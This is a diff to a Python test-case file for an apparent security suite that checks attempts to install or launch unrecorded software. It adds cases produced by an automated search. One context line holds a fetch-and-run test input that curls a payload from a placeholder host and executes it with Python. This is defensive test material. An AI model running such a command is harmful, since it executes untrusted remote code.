@@ -385,6 +385,31 @@ CASES += [
     pipe_case('P4-PIPE-3', 'python3 -c "$(curl -fsS @HTTP@/payload.py)"'),
 ]
 
+# ---------------------------------------------------------------- the successes of the search ([f6] of CORRECTIONS.md)
+#
+# Plan, Section 9.5: “Each success becomes a new case, committed before the next complete run … Cases are only added
+# in this way, never removed or weakened.” casedefs_search.py is written by tools/make-search-cases.py from the
+# tables and scripts of the search and the builder's finding; nothing of it is typed here. The attempt is the
+# route's own script, sent as the search sent it; the probe is the condition of its `RESULT RAN` line; the outcome
+# rule is that of every saved-code case of P4 (p4 above). `made`: what the route's typed commands create.
+from casedefs_search import SEARCH_CASES  # noqa: E402
+
+SEARCH_SRC = ('plan, Section 9.5: “Each success becomes a new case, committed before the next complete run”; and '
+              'Table 9, P4: “Through every channel of [3], Section 4.3, an attempt is made to install, launch or '
+              'change what is not recorded”')
+for _s in SEARCH_CASES:
+    _steps = [tuple(x) for x in _s['steps']]
+    _first = _steps[:2] if _s.get('line_first') else []      # the line of the program the route needs, applied
+    _c = p4(_s['id'], _steps[len(_first):],
+            note=f"a success of the search: {_s['table']}, row {_s['row']} ({_s['program']}); attempt from "
+                 f"{_s['script']}")
+    _c['steps'] = _first + _c['steps']
+    _c['source'] = SEARCH_SRC
+    _c['made'] = [tuple(x) for x in _s['made']]
+    if _s.get('tool'):
+        _c['tool'] = _s['tool']
+    CASES.append(_c)
+
 # ---------------------------------------------------------------- Removal
 
 REM_SRC = ('Table 9, Removal: “The lines of a program, a service and a rule are removed and the declaration applied; '
